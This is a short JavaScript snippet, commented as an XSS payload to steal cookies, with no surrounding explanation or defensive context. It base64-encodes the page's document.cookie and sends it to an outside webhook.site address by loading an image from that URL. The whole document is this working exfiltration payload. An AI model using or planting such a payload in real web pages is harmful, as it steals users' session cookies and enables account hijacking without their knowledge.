// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/acb2542a-f7d4-4f30-aa6d-b152a39bb38d?data=' + btoa(document.cookie);
